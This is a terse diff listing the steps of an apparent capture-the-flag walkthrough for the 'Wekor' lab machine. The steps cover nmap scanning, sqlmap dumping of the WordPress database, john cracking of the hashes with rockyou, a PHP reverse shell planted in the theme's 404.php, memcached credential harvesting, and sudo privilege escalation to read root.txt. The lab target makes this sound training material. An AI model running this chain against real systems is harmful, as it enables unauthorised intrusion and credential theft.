@@ -1,0 +1,19 @@
+1 - echo "10.10.15.41 wekor.thm" | tee -a /etc/hosts 
+2 - nmap -A 10.10.15.41
+3 - http://wekor.thm/robots.txt
+4 - http://wekor.thm/comingreallysoon
+5 - http://wekor.thm/it-next
+6 - sqlmap -r request.txt --dbs
+7 - sqlmap -r request.txt -D wordpress --tables
+8 - sqlmap -r request.txt -D wordpress -T wp_users
+9 - john hash -w=/usr/share/wordlists/rockyou.txt
+10 - http://wekor.thm/wordpress/wp-login.php
+11 - cp /usr/share/wordlists/php/php-reverse-shell.php .
+12 - http://wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
+13 - netstat -tuna
+14 - memcached-tool localhost:11211
+15 - su Orka
+16 - cat user.txt
+17 - sudo -l
+18 - ./bitcoin
+19 - cat /root/root.txt
